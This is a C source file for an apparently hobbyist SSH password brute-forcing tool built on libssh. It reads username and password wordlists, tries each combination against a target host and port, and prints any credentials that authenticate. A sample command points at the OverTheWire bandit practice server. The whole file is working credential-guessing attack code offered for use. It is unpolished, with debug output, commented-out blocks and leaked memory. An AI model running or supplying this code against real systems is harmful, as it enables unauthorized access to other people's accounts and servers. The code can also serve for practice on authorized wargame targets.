#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <libssh/libssh.h>

//Example command: ./thing ssh bandit.labs.overthewire.org -u bandit0 -P passwords.txt -s 2220

int sshAttempt(char* destination, char* username, char* password, ssh_session my_ssh);
void sshOutput(int attemptStatus, ssh_session my_ssh);


//Global variables
char *service;
char *destination;
int port;
char *usr = NULL;
char *usrFilename = NULL;
char *pass = NULL;
char *passFilename = NULL;
FILE *usrFile;
FILE *passFile;

//Candidate names: passwordSquirt, sprinkler, octopus, passqrt, squirt, passquirt, 
/*Command line parsing*/
int main(int argc, char *argv[]) {
    int opt;
    usr = malloc(256*sizeof(char));
    pass = malloc(256*sizeof(char));
    // printf("Initial Pass address:%p", &pass);
    
    /*Expected input:
        name service destination [-s PORT] [-u USERNAMES] [-p PASSWORD] {more stuff later}
        bandit.labs.overthewire.org
    */
    
    /*Command line parsing*/

    printf("optind: %i, arg: %s\n", optind, argv[optind]);
    while (optind < argc) {
        if ((opt = getopt(argc, argv, ":s:u:p:U:P:")) != -1) {
            printf("optind: %i, arg: %s\n", optind, argv[optind]);
            switch (opt) {
                case 's':
                    port = atoi(optarg);
                    break;
                case 'u':
                    usr = optarg;
                    break;
                case 'U':
                    usrFilename = optarg;
                    break;
                case 'p':
                    pass = optarg;
                    break;
                case 'P':
                    passFilename = optarg;
                    break;
                case ':':
                    printf("Option -%c requires an argument\n", optopt);
                    exit(1);
                    break;
                case '?':
                    printf("Unknown option -%c", optopt);
                    exit(1);
                    break;
                default:
                    printf("default\n");
                    break;
            }
        
        } else {
            if (!strncmp(argv[optind], "ssh", 4)) {
                service = "ssh";
            } else {
                destination = argv[optind];         
            }
            optind++;
        }
    }

    // while (optind < argc) {
    //     int save = optind;
    //     opt = getopt(argc, argv, ":s:u:U:p:P:");
        
    //     printf("optind: %i, option: %s\n", optind, argv[optind]);
        
    //     switch (opt) {
    //         case 's':
    //             port = atoi(optarg);
    //             break;
    //         case 'u':
    //             usr = optarg;
    //             break;
    //         case 'U':
    //             usrFilename = optarg;
    //             break;
    //         case 'p':
    //             pass = optarg;
    //             break;
    //         case 'P':
    //             passFilename = optarg;
    //             break;
    //         case ':':
    //             printf("Option -%c requires an argument\n", optopt);
    //             exit(1);
    //             break;
    //         case '?':
    //             printf("Unknown option -%c", optopt);
    //             exit(1);
    //             break;
    //         case -1:
    //             //A non-option argument: must be either destination or service
    //             if (!strncmp(argv[optind], "ssh", 4)) {
    //                 service = "ssh";
    //             } else {
    //                 destination = argv[optind];
    //             }
    //             optind++;
    //             break;
    //         default:
    //             exit(1);
    //             break;

    //     }
    // }

    //Error checking


    // printf("Passed command line checking\n");

    /*===Services===*/
    int success = 0;
    if (!strcmp(service, "ssh")) {
        //Create a new ssh_session handler
        

        if (usrFilename != NULL && passFilename != NULL) {
            usrFile = fopen(usrFilename, "r");
            passFile = fopen(passFilename, "r");
            
            if (usrFile == NULL && passFile == NULL) {
                printf("File not found: %s\nFile not found: %s",usrFilename, passFilename);
                exit(1);
            } else if (usrFile == NULL) {
                printf("File not found: %s\n",usrFilename);
                exit(1);
            } else if (passFile == NULL) {
                printf("File not found: %s\n",passFilename);
                exit(1);
            }

            while (fgets(usr, 256, usrFile) != NULL) {
                if(usr[strlen(usr)-1] == '\n') {
                    usr[strlen(usr)-1] = '\0';
                }                
                while (fgets(pass, 256, passFile) != NULL) {
                    // Replace new line with null to mark end of password
                    if(pass[strlen(pass)-1] == '\n') {
                        pass[strlen(pass)-1] = '\0';
                    }
                    ssh_session my_ssh = ssh_new();
                    if (sshAttempt(destination, usr, pass, my_ssh) == SSH_AUTH_SUCCESS) {
                        break;
                    }   
                }
                rewind(passFile);
            }
            fclose(usrFile);
            fclose(passFile);
        } else if (usrFilename != NULL) {
            usrFile = fopen(usrFilename, "r");
            if (usrFile == NULL) {
                printf("File not found: %s\n",usrFilename);
                exit(1);
            }
            while (fgets(usr, 256, usrFile) != NULL) {
                if(usr[strlen(usr)-1] == '\n') {
                    usr[strlen(usr)-1] = '\0';
                }
                ssh_session my_ssh = ssh_new();
                sshAttempt(destination, usr, pass, my_ssh);   
            }
            fclose(usrFile);
        } else if (passFilename != NULL) {
            passFile = fopen(passFilename, "r");
            if (passFile == NULL) {
                printf("File not found: %s\n",passFilename);
                exit(1);
            }
            while (fgets(pass, 256, passFile) != NULL) {
                if(pass[strlen(pass)-1] == '\n') {
                    pass[strlen(pass)-1] = '\0';
                }            
                ssh_session my_ssh = ssh_new();
                if (sshAttempt(destination, usr, pass, my_ssh) == SSH_AUTH_SUCCESS) {
                    break;
                }  
            }
            fclose(passFile);
        } else {
            ssh_session my_ssh = ssh_new();
            sshAttempt(destination, usr, pass, my_ssh);   
        }

        // ssh_free(my_ssh);
    }
    
    // free(pass);
    // free(usr);
    
    return 0;
}

/*
Input:
    - destination: IP address or hostname to attack
    - username and password for SSH login
    - my_ssh handler
Output: int attemptStatus. Tells whether the auth is sucessful.
*/
int sshAttempt(char* destination, char* username, char* password, ssh_session my_ssh) {
    //Configure the options before making an SSH connection
    ssh_options_set(my_ssh, SSH_OPTIONS_HOST, destination);
    ssh_options_set(my_ssh, SSH_OPTIONS_PORT, &port);
    ssh_options_set(my_ssh, SSH_OPTIONS_USER, usr);
    
    //Connect to SSH server
    int rc = ssh_connect(my_ssh);
    if (rc != SSH_OK) {
        fprintf(stderr, "Error connecting to host: %s\n",
            ssh_get_error(my_ssh));
        ssh_free(my_ssh);
        exit(-1);
    }

    //printf("Successful connection\n");
    //printf("User:%s, Pass:%s\n", usr, pass);
    int attemptStatus = ssh_userauth_password(my_ssh, NULL, pass);
    sshOutput(attemptStatus, my_ssh);
    return attemptStatus;
}

void sshOutput(int attemptStatus, ssh_session my_ssh) {
    if(attemptStatus == SSH_AUTH_SUCCESS) {
        printf("Authentication successful. || Destination:%s || Username:%s || Password:%s\n", destination, usr, pass);
        ssh_disconnect(my_ssh);
    } else if(attemptStatus == SSH_AUTH_DENIED) {
        printf("Authentication failure. Password:%s is not valid for user: %s\n", pass, usr);
        ssh_disconnect(my_ssh);
    } else {
        fprintf(stderr, "Error authenticating with password: %s\n",
        ssh_get_error(my_ssh));
        ssh_disconnect(my_ssh);
    }
    
    ssh_free(my_ssh); //Do we really wanna free and allocate new ssh_session every time?

    return;
}